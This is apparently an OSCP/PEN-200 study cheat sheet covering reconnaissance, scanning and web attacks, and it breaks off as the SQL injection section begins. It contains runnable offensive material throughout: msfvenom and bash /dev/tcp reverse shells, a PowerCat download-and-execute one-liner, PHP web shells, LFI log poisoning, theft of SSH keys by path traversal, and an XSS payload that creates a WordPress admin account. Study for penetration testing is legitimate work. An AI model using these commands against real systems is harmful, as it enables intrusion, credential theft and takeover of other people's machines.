## 📑 Table of Contents

- [Resources](#resources)
- [Methodology](#methodology)
- [PWK-200 syallabus](#pwk-200-syallabus) 
  - [6. Information gathering](#6-information-gathering)
  - [7. Vulnerability scanning](#7-vulnerability-scanning)
  - [8. Introduction to web applcation attacks](#8-introduction-to-web-applcation-attacks)
  - [9. Common Web Application attacks](#9-common-web-application-attacks)
  - [10. SQL injection attacks](#10-sql-injection-attacks)
  - [11. Phishing Basics](#11-phishing-basics)
  - [12. Client-site attacks](#12-client-site-attacks)
  - [13. Locating public exploits](#13-locating-public-exploits)
  - [14. Fixing exploits](#14-fixing-exploits)
  - [15. Password attacks](#15-password-attacks)
  - [16. Antivirus evasion](#16-antivirus-evasion)
  - [17. Windows Privilege Escalation](#17-windows-privilege-escalation)
  - [18. Linux privilege escalation](#18-linux-privilege-escalation)
  - [19. Port redirection and SSH tunneling](#19-port-redirection-and-ssh-tunneling)
  - [20. Tunneling through deep packet inspectation](#20-tunneling-through-deep-packet-inspectation)
  - [21. The metassploit framework](#21-the-metassploit-framework)
  - [22. Active directory introduction and enumeration](#22-active-directory-introduction-and-enumeration)
  - [23. Attacking active drectiory authentication](#23-attacking-active-drectiory-authentication)
  - [24. Lateral movement in active directory](#24-lateral-movement-in-active-directory)
  - [25. Enumerating AWS Cloud Infrastruture](#25-enumerating-aws-cloud-infrastruture)
  - [26. Attacking AWS cloud infrastruture](#26-attacking-aws-cloud-infrastruture)
  - [27. Assembling the pieces](#27-assembling-the-pieces)
- [PWK-200 labs](#pwk-200-labs)  
  - [Information gathering](#information-gathering)
  - [Introduction to web applcation attacks](#introduction-to-web-applcation-attacks)
  - [Common Web Application attacks](#common-web-application-attacks)
  - [SQL injection attacks](#sql-injection-attacks)
  - [Client-site attacks](#client-site-attacks)
  - [Locating public exploits](#locating-public-exploits)
  - [Fixing exploits](#fixing-exploits)
  - [Antivirus evasion](#antivirus-evasion)
  - [Password attacks](#password-attacks)
  - [Linux privilege escalation](#linux-privilege-escalation)
  - [Port redirection and SSH tunneling](#port-redirection-and-ssh-tunneling)
  - [Tunneling through deep packet inspectation](#tunneling-through-deep-packet-inspectation)
  - [The metassploit framework](#the-metassploit-framework)
  - [Active directory introduction and enumeration](#active-directory-introduction-and-enumeration)
  - [Attacking active drectiory authentication](#attacking-active-drectiory-authentication)
  - [Lateral movement in active directory](#lateral-movement-in-active-directory)
  - [Enumerating AWS Cloud Infrastruture](#enumerating-aws-cloud-infrastruture)
  - [Attacking AWS cloud infrastruture](#attacking-aws-cloud-infrastruture)
  - [Assembling the pieces](#assembling-the-pieces)
- [Penetration testing report](#penetration-testing-report)
- [Penetration testing stages](#penetration-testing-stages)
- [Recommended OSCP Cracking Tools & Usage (2025)](#recommended-oscp-cracking-tools--usage-2025)
- [OSCP Pro Tips](#oscp-pro-tips)
- [Kali setup](#kali-setup)

## Resources
- [OffSec student portal](https://help.offsec.com/hc/en-us/articles/9550819362964-Connectivity-Guide) 
- [OffSec Discord](https://discord.gg/offsec)
  - OffSec portal > Explorer > Discord > link OffSec account to discord
- [OffSec Study Plan and Exam FAQ](https://help.offsec.com/hc/en-us/sections/6970444968596-Penetration-Testing-with-Kali-Linux-PEN-200)
- Capture the Flag  
  - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
  - Find flag:  
    - Linux: `find / -name "flag.txt" 2>/dev/null`  (cat flag.txt)  
    - Windows: C:\Windows\system32> `where /r C:\ flag.txt`  (type flag.txt)  
    - Windows: PS C:\Windows\System32\WindowsPowerShell\v1.0> `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue` (type flag.txt)  
  - ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
    - aspx: cmdasp.aspx
    - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
    - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
  - generate reverse shell payload  
    **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
    **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
    **step 3 generate payload based on target platform**  
    - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe'  
    - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe'  
    - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
    - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
    - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
    - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
    - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
      
    **Tips:**  
    - Always match LPORT between payload and nc  
    - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
    - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls  
  - Kali port:
    - 4444 (reverse shell)
    - 8080 (burp suite)
    - 8888 (WebDAV shared)
    - 8000 (Powercat/Python)
    - 9001 (alternative to 4444 various reverse shell listeners)  
  - Target port
	| Port | Protocol | Service              | Description / Use Case                                  |
	|------|----------|----------------------|----------------------------------------------------------|
	| 21   | TCP      | FTP                  | Anonymous login, misconfig, potential file upload        |
	| *22   | TCP      | SSH                  | Weak passwords, key reuse, outdated versions             |
	| 23   | TCP      | Telnet               | Plain-text credentials, banner info                      |
	| 25   | TCP      | SMTP                 | User enum, phishing, open relay                          |
	| 53   | TCP/UDP  | DNS                  | Zone transfers, DNS enumeration                          |
	| *80   | TCP      | HTTP                 | Web apps (SQLi, LFI/RFI), Gobuster, Nikto                |
	| 88   | TCP      | Kerberos             | AS-REP roasting, Kerberoasting (Active Directory)        |
	| 110  | TCP      | POP3                 | Cleartext creds, vulnerable auth                         |
	| 111  | TCP/UDP  | RPCBind              | NFS, remote procedure enumeration                        |
	| 135  | TCP      | MS RPC               | Lateral movement, DCOM exploitation                      |
	| 139  | TCP      | NetBIOS              | SMB enumeration, shares                                  |
	| 143  | TCP      | IMAP                 | Cleartext creds, mailbox enum                            |
	| 161  | UDP      | SNMP                 | Public community strings, SNMPwalk                       |
	| 389  | TCP/UDP  | LDAP                 | AD enum, user/group info                                 |
	| *445  | TCP      | SMB                  | EternalBlue, shares, null sessions, LPE                 |
	| 512  | TCP      | RSH                  | Remote shell, legacy service                             |
	| 513  | TCP      | RLogin               | Legacy login service                                     |
	| 587  | TCP      | SMTP (Submission)    | Authenticated email sending                              |
	| 5985 | TCP      | WinRM                | Remote PowerShell execution                              |
	| 8000 | TCP      | HTTP-alt             | Python web server, custom services                       |
	| 8080 | TCP      | Web Proxies          | Tomcat, Jenkins, apps on alt ports                       |
	| 8443 | TCP      | HTTPS-alt            | Web services over TLS                                    |
	| 8888 | TCP      | Web Apps             | Jupyter, Flask, development interfaces                   |
	| 3306 | TCP      | MySQL                | SQLi, default creds, data extraction                     |
	| 3389 | TCP      | RDP                  | GUI access (if creds found)                              |
	| 5432 | TCP      | PostgreSQL           | SQLi, privilege escalation                               |
	| 5900 | TCP      | VNC                  | GUI access, no auth                                      |
  - File transfer
    - windows <> Kali
      ```
      sudo apt install pipx -y
      pipx ensurepath
      pipx install wsgidav
      mkdir ~/share

      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share

      On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
      ```
    - RDP <> Kali
      `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
    - Linux <> Kali
    - SMB (port 445)
      - `smbclient -L \\\\192.168.171.10`: List available SMB shares on the target  
      - `smbclient \\\\192.168.171.10\\Users -N`: Connect to the Users share anonymously  
        smb: \> ls  
	smb: \offsec\Downloads\> ls  
	smb: \offsec\Downloads\> get flag.txt
    - Kali find file: `find ~/ -iname "mimikatz.exe"`
    - transfer exploit to windows machine
      `scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe IEUser@192.168.56.104:/Users/IEUser/` OR
      ```
      download the package from https://github.com/gentilkiwi/mimikatz/releases
      unzip to /home/kali/offsec/tools/minikatz
      cd to /home/kali/offsec/tools/minikatz/x64
      python3 -m http.server 80

      target open the http://<KALI>
      ```
  - Selecting [exploit](https://www.exploit-db.com/) rules
    - Priority
      - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
    - Non-priority
      - DoS, requires authentication, need compilation, PoC without reverse shell, MSF module, written in unfamiliar language like perl/Java

## Methodology 

## PWK-200 syallabus
### 6. Information gathering  
   **Passive**
   - **OSINT**: public available info of a target
   - **Whois**: domain name info  
     `whois megacorpone.com -h 192.168.50.251`: lookup personnel contact, name server  
     `whois 38.100.193.70 -h 192.168.50.251`: reverse lookup
   - **google hacking**: uncover critical information, vulnerabilities, and misconfigured websites  
     `site:mega.com filetype:txt`  
     `site:mega.com -filetype:html` : exclude html page  
     `intitle: "index of" "parent directory"`: directory listing
   - [Google hacking database](https://www.exploit-db.com/google-hacking-database)
   - [faster google dorking](https://dorksearch.com/)
   - [Netcraft](https://searchdns.netcraft.com/): discover site tech, subdomains
   - [wappalzer](https://www.wappalyzer.com/websites/<domain>/)
   - **open-source code** search (small repo:[GitHub](https://github.com/), [GitHub Gist](https://gist.github.com/), [GitLab](https://about.gitlab.com/), [SourceForge](https://sourceforge.net/). larger repos: [Gitrob](https://github.com/michenriksen/gitrob), [Gitleaks](https://github.com/zricethezav/gitleaks))  
     `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v`: scans for API keys, private keys, credentials
   - [Shodan](https://www.shodan.io/): search engine for internet-connected devices to discover servers, devices, DBs, IoT
   - [security headers and SSL/TLS](https://securityheaders.com/)
   - [Qualys SSL Labs](https://www.ssllabs.com/ssltest/)
   - LLM: chatGPT prompt; can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test; Retrieve the technology stack of the megacorpone.com website; 20 Google dorks aimed to our target website
   - [Datanyze](),6sense(): web tech stack response

   **Active**
   - **DNS (friendly domain names to IP)**
     - NS (authoritative server), A (IPv4), AAAA (Ipv6), MX (Main exchange), PTR (reverse lookup zones), CNAME (alias for other host records), TXT (domain ownershiip verification)
     - `host www.megacorpone.com`: use host to find IP/A record
     - `host -t mx www.megacorpone.com`: use -t to find other record types  
     - `host -t txt megacorpone.com`: find more info  
     - `host idontexist.megacorpone.com`: use host to search invalid host
     - `for ip in $(cat /usr/share/seclists); do host $ip.megacorpone.com; done`: find possible hostname. Note: `sudo apt install seclists`
     - `for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"`: using reverse DNS lookups to scan IP 51.122.169.200-254 and filter out not found results
     - `dnsrecon -d megacorpone.com -t std`: automate DNS enumeration (domain name + standard type enumeration)
     - `dnsrecon -d megacorpone.com -D ~/list.txt -t brt`: brute force hostname by dnsrecon
     - `dnsenum megacorpone.com`: automate DNS enumeration
     - `xfreerdp /u:student /p:lab /v:192.168.50.152`: rdp login
     - `nslookup mail.megacorptwo.com`: use nslookup to enumerate host
     - `nslookup -type=TXT info.megacorptwo.com 192.168.50.151`: use nslookup to query more info
   - **TCP/UDP port scan**
     - `nc -nvv -w 1 -z 192.168.50.152 3388-3390`: netcat TCP port scan
     - `nc -nv -u -z -w 1 192.168.50.149 120-123`: netcat UDP port scan
     - `nmap 192.168.50.149`: default 1000 ports scan
     - `sudo nmap -sS 192.168.50.149`: SYN/stealth scan
     - `nmap -sT 192.168.50.149`: TCP connect scan
     - `sudo nmap -sU 192.168.50.149`: UDP scan
     - `sudo nmap -sU -sS 192.168.50.149`: UDP + SYN scan (reveal additional open UDP ports)
     - `nmap -sn 192.168.50.1-253`: network sweep for large volumes of hosts. 
     - `nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt` `grep Up ping-sweep.txt | cut -d " " -f 2`: grep live host
     - `nmap -p 80 192.168.50.1-253 -oG web-sweep.txt`: scan for port 80
     - `nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`: scan multiple IPs
     - `cat /usr/share/nmap/nmap-services`: show open frequency
     - `sudo nmap -O 192.168.50.14 --osscan-guess`: OS finger printing
     - `nmap -sT -A 192.168.50.14`: banner grabbing and/or service enumeration
     - `nmap --script http-headers 192.168.50.6`: nmap’s scripting engine (NSE) for OS fingerprinting
     - `Test-NetConnection -Port 445 192.168.50.151`: Port scanning SMB via PowerShell. Result returns TcpTestSucceeded : True
     - `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`: Automating the PowerShell portscanning****
   - **SMB Enumeration**
     - `nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254`: scan for the NetBIOS service  
     - `sudo nbtscan -r 192.168.50.0/24`: nbtscan to collect additional NetBIOS information  
     - `ls -1 /usr/share/nmap/scripts/smb*`: Finding various nmap SMB NSE scripts (SMBv1)  
     - `nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`: nmap scripting engine to perform OS discovery (might be incorrect)  
     - `net view \\dc01 /all`: ‘net view’ to list remote shares  
   - **SMTP Enumeration**
     - `nc -nv 192.168.50.8 25`: Using nc to validate SMTP users  
     - `python3 smtp.py root 192.168.50.8`: Python script to perform SMTP user enumeration  
     - `Test-NetConnection -Port 25 192.168.50.8`: Port scanning SMB via PowerShell. `dism /online /Enable-Feature /FeatureName:TelnetClient`: install TelnetClient. `telnet 192.168.50.8 25`: interat with SMTP service via Telnet on Windows  
   - **SNMP Enumeration**
     - Ip spoofing， replay attacks, SNMPv1,2,2c no traffic encryption
     - `sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt`: nmap SNMP scan to obtain email (c:community string, v:SNMP version, t:timeout)
     - Using onesixtyone to brute force community strings
       ```
       echo public > community
       echo private >> community
       echo manager >> community
       for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
       onesixtyone -c community -i ips
       ```
     - `snmpwalk -c public -v1 -t 10 192.168.50.151`: snmpwalk to enumerate the entire MIB tree
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25`: snmpwalk (OID) to enumerate Windows users
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2`: snmpwalk to enumerate Windows processes
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2`: snmpwalk to enumerate installed software
     -  `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3`: snmpwalk to enumerate open TCP ports
   - **nmap**  
     `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`: scans all open 65535 TCP ports  
     `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`: scans 1-1024 common UDP ports  

      | Flag         | Description                                                                 |
      |--------------|-----------------------------------------------------------------------------|
      | `-sV`        | Enables **version detection** to identify software versions on services     |
      | `-sC`        | Runs Nmap’s **default NSE scripts** (same as `--script=default`)            |
      | `-p-`        | Scans **all 65535 TCP ports**                                               |
      | `-v`         | Enables **verbose output** to see scan progress in real time                |
      | `-T4`        | Sets scan to **aggressive timing** (faster, less stealthy)                  |
      | `-sT`        | Performs a **TCP connect scan** (full 3-way handshake, useful if not root)  |
      | `--open`     | Shows **only open ports**, hides closed or filtered ports                   |
      | `IP_ADDRESS` | Target IP address to scan (replace with actual target)                      |
      | `-oN results`| Saves output in **normal format** to a file named `results`                 |

  **LLM Passive Information Gathering**
  - Using public data from MegacorpOne's website and any information that can be inferred about its organizational structure, products, or services, generate a comprehensive list of potential subdomain names: DNS subdomain wordlist
  - `gobuster dns -d megacorpone.com -w wordlist.txt -t 10`: gobuster DNS subdomain enumeration with our LLM-generated wordlist
  - What is the WHOIS information for the domain megacorpone.com?" Based on the response, who is listed as the registrant of megacorpone.com?
  - Can you generate the best Google dorks for the website megacorpone.com?
  - What public information is available about the leadership of MegacorpOne.com and their social media presence?
  - Can you provide the top Google dorks to search for exposed repositories related to megacorpone.com?
    
### 7. Vulnerability scanning
   - host discovery
   - port scanning
   - OS, service, version detection
   - Matching results to vulnerability db ([NVD](https://nvd.nist.gov/), [CVE](https://cve.mitre.org/cve/search_cve_list.html), [CVSS](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/vulnerability-scanning-theory-48706/how-vulnerability-scanners-work-48663), [CVSS calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
   - unauthenticated (view from external attacker) and authenticated scan (privileged user check for vulnerable packages, missing patches, or configuration vulnerabilities)
   - internal vulnerability scan (VPN or scan on-site) and DMZ + External (public facing) scan
   - consideration: scanning duration, accessible, firewalls, rate limiting, impact
   - [Nessus scan](https://www.tenable.com/downloads/nessus?loginAttempted=true) (pg 173 install) > scan template > launch scan > host > findings > vulnerability priority rating (VPR) > remediation > report
     ```
     echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0- debian10_amd64.deb" > sha256sum_nessus
     sha256sum -c sha256sum_nessus
     sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
     sudo /bin/systemctl start nessusd.service (start nessus after successful Nessus install)
     ```  
     - launch a browser https://127.0.0.1:8834
     - Nessus scan templates: discovery (host), compliance (windows config compliance), vulnerabilities (CVE, missing patches, minconfig)
     - Basic network scan: name, targets (IP), custom scan type (port 80,443), ping remote host (off)
     - Authenticated scan: credential patch audit, credentials (SSH; SMB or WMI against Windows), AV/Firewall/UAC blocking check
     - Specific plugin: Advanced Dynamic Scan, credentilas, Dynamic Plugins (CVE), select plugin family (ubuntu local security checks)
   - nmap NSE
     - found in "/usr/share/nmap/scripts/"
     - `sudo nmap --script-updatedb`
     - `sudo nmap -sV -p 443 --script "vuln" 192.168.50.124`: vuln scan n port 443
     - Google "CVE-2021-41773 nse" and download NSE from github `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`
     - `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124`: provide vuln name, target, port > additional vulnerability
       
### 8. Introduction to web applcation attacks
   - **Fingerprinting Web Servers** with Nmap  
     `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner  
     `sudo nmap -p80 --script=http-enum 192.168.50.20`: NSE enum web server (pages discovery)  
   - [Wappalyzer](https://www.wappalyzer.com/): technology stack
   - [Gobuster](https://www.kali.org/tools/gobuster/): wordlists to discover directories and files  
     `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
   - Burp Suite
     - Only http traffic, no cert install_, enable_intercept(forward or drop), proxy listerner on localhost:8080
     - Browser proxy setting: about:preferences#general > settings > networks setting > http proxy (host 127.0.0.1,port 8080 + use this proxy for HTTPS) & SOCKSv4 (host 127.0.0.1, port 9060)
   - Burp Suite intercept, proxy > HTTP history > send to repeater (send request), intruder (brute force attack in $position)
   - URL file extension, Debug page content (browser tool 'debugger' + pretty print + inspector tool)
   - inspect HTTP response headers and sitemaps (browser tool 'network')
   - sitemaps `curl https://www.google.com/robots.txt`
   - Gobuster: enumerate APIs  
     **pattern file**  
     {GOBUSTER}/v1  
     {GOBUSTER}/v2  
  
     ```
     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern: brute force API paths
     curl -i http://192.168.50.16:5002/users/v1: obtain user info
     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt: discover extra APIs
     curl -i http://192.168.50.16:5002/users/v1/admin/password: probe API > unsupported method
     curl -i http://192.168.50.16:5002/users/v1/login: inspect 'login' API > user not found
     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login: POST request > password is not correct for the given username
     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: Register > email required  
     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: POST request register success
     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login: login as admin > token received

     Change the Administrator Password
     curl -X 'PUT' \
      'http://192.168.50.16:5002/users/v1/admin/password' \
      -H 'Content-Type: application/json' \
      -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb IHbJI7f9KaRAkrywoaRUAsgA4' \
      -d '{"password": "pwned"}'
      ```

  - **Cross-site scripting**  
     - reflected: payload in a crafted request or link. search field or user input included in error messages. 
     - stored/persistent: exploit payload is stored in a database. web application then retrieves this payload and displays it to anyone who visits a vulnerable page. forum comment, product review.  
     - DOM-based: page’s DOM is modified with user-controlled values  
     - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
     - User-Agent `<script>alert(1)</script>`  
     - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
     - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
     - Create a new WordPress Admin account  
       - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression `var nonceRegex = /ser" value="([^"]*?)"/g;`    
         ```
         var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
         ajaxRequest = new XMLHttpRequest();
         ajaxRequest.open("POST", requestURL, true);
         ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         ajaxRequest.send(params);
         ```
      - minify attack code into a one-liner via [JS Compress](https://jscompress.com/). Encode the minified Javascript code  
        ```
        function encode_to_javascript(string) {
          var input = string
          var output = '';
          for(pos = 0; pos < input.length; pos++) {
          output += input.charCodeAt(pos);
          if(pos != (input.length - 1)) {
          output += ",";
          }
         }
         return output;
         }
         let encoded = encode_to_javascript('insert_minified_javascript')
         console.log(encoded)
        ```
      - launch attack on user-agent field  
        ```
        curl -i http://offsecwp --user-agent
        "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,1
        ...))</script>" --proxy 127.0.0.1:8080
        ```  
        XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins

### 9. Common Web Application attacks
   - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
     - `ls ../`: root system
     - `ls ../../`: backward to 2 previous directories 
     - absolute path: `cat /home/kali/etc/passwd`  
     - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
     - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
     - hovering the site and find "http://mountaindesserts.com/meteor/index.php?page=admin.php"  
     - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
        The output of /etc/passwd shows a user called "offsec"
     - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
     - `chmod 400 dt_key`
     - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
     - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
   - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
     - **Local file inclusion (LFI)** Includes files from the local server filesystem. E.g http://target.com/index.php?page=../../../../etc/passwd
       - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
       - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
       - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
       - `../../../../../../../../../var/log/apache2/access.log&cmd=la%20-la`: URL encoding to bypass the bad request error of space
       - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`: shell or `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`: bash reverse shell
       - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`: encode the special chr with URL encoding
       - before we send the request, start Netcat listener on port 4444. it will receive the incoming reverse shell from the target system `nc -nvlp 4444`
       - target run on "XAMPP", apache logs found in C:\xampp\apache\logs\
     - **PHP wrappers** can be used to represent and access local or remote filesystems. Use this to bypass filters or obtain code execution via File Inclusion vulnerabilities.
       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: “php://filter” to include unencoded admin.php
       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`: “php://filter” to include base64 encoded admin.php
       - `echo <base64 encoded text> | base64 -d`: Decoding the base64 encoded content of admin.php. Decooded data contains MySQL credentials
       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`: Usage of the “data://” wrapper to execute ls
       - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
       - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
     - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
       - Requires allow_url_include=On in PHP config  
       - PHP webshell locates in kali "/usr/share/webshells/php/"  
       - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
       - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
       - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
     - **File upload vulnerabilities**
       - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
       - file upload + code execution to obtain reverse shell  
       - **upload txt file** (acceped) > bypass php file extension (.phps, .php7, pHP)  
       - **execute command** `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
       - kali webshells at **"/usr/share/webshells/"**
       - step 2: netcat listener `nc -nvlp 4444` while listening 
       - step 3: PowerShell one-liner to encode the reverse shell  
       - step 4: execute the base64 encoded reverse shell oneliner
         ```
         curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
         enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
         dAAuAFMAbwBjAGsAZQB0
         ...
         AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
         GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
         ```
      - trial and error tricks: upload file 2 times (file already exists then burte force, error for language/web tech)  
      - **modify the filename** `../../../../../test.txt` in burp request  
      - overwrite the authorized_keys (non executable file)    
        - `ssh-keygen` : generate public/private rsa key pair
        - `cat fileup.pub > authorized_keys` : our public key  
        - `./../../../../../../root/.ssh/authorized_key` upload it using the relative path (burp intercept the request and modify the filename > forward)  
        - `rm ~/.ssh/known_hosts`: avoid error that cannot verify the host key saved previously  
        - `ssh -p 2222 -i fileup root@mountaindesserts.com`: use our private key to ssh
   - **Command injection**  
     - git clone https://gitlab.com/exploit-database/exploitdb.git (skip this step)  
     - bad commands detected (ipconfig), try git
     - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
     - identify the commands are executed by PowerShell or CMD  
     - `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`: Code Snippet to check where our code is executed  
     - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
      
     - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
     - `python3 -m http.server 80`
     - `nc -nvlp 4444`  
     - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
     - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  

### 10. SQL injection attacks  
- MySQL, Microsoft SQL Server, PostgreSQL, and Oracle
- `mysql -u root -p'root' -h 192.168.50.16 -P 3306`: connect mysql
